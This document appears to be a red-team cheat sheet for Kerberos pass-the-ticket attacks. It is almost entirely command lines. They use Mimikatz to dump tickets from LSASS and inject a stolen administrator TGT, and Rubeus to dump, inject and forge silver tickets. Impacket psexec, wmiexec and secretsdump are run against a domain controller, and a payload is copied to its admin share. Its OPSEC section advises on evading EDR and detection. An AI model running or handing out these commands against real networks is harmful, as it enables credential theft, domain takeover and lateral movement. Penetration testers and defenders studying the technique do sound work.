# Pass-the-Ticket Attack Workflows

## Workflow 1: Mimikatz Ticket Extraction and Injection

### Step 1: Export Tickets from LSASS
```powershell
# Dump all Kerberos tickets from memory
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# List exported .kirbi files
dir *.kirbi

# Identify high-value tickets (Domain Admin TGTs)
# Look for: [0;xxxxx]-2-0-40e10000-administrator@krbtgt-DOMAIN.LOCAL.kirbi
```

### Step 2: Inject Ticket into Session
```powershell
# Purge existing tickets
mimikatz.exe "kerberos::purge" "exit"

# Or with klist
klist purge

# Import stolen ticket
mimikatz.exe "kerberos::ptt [0;xxxxx]-2-0-40e10000-administrator@krbtgt-DOMAIN.LOCAL.kirbi" "exit"

# Verify ticket is loaded
klist
```

### Step 3: Access Resources
```powershell
# Access file shares as impersonated user
dir \\dc01.domain.local\c$

# Execute commands remotely
PsExec.exe \\dc01.domain.local cmd.exe

# Access admin shares
copy payload.exe \\dc01.domain.local\c$\windows\temp\
```

## Workflow 2: Rubeus Ticket Operations

### Dump and Inject
```powershell
# Dump all tickets (requires local admin)
.\Rubeus.exe dump

# Dump tickets for specific LUID
.\Rubeus.exe dump /luid:0x3e4

# Extract TGT for current user (no admin required)
.\Rubeus.exe tgtdeleg

# Inject ticket from base64
.\Rubeus.exe ptt /ticket:doIFmjCC...base64ticket...

# Create sacrificial process with ticket
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ptt /ticket:base64ticket
```

## Workflow 3: Linux-Based Pass-the-Ticket (Impacket)

### Convert and Use Tickets
```bash
# Convert .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set environment variable for ticket
export KRB5CCNAME=ticket.ccache

# Use with Impacket tools
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-smbexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-wmiexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-secretsdump -k -no-pass domain.local/administrator@dc01.domain.local

# List accessible shares
impacket-smbclient -k -no-pass domain.local/administrator@dc01.domain.local
```

## Workflow 4: Silver Ticket (Forged TGS)
```powershell
# Create silver ticket with Mimikatz (requires service account NTLM hash)
mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:NTLM_HASH /ptt" "exit"

# Create silver ticket with Rubeus
.\Rubeus.exe silver /service:cifs/server.domain.local /rc4:NTLM_HASH /user:administrator /domain:domain.local /sid:S-1-5-21-xxx /ptt
```

## OPSEC Considerations

1. Stolen tickets have limited lifetime (default 10 hours for TGT)
2. TGT reuse from different IP may trigger advanced detection
3. Silver tickets bypass the KDC entirely - harder to detect
4. Use createnetonly in Rubeus to avoid overwriting legitimate tickets
5. Monitor for credential guard which protects Kerberos tickets
6. Be aware that some EDR solutions monitor ticket injection
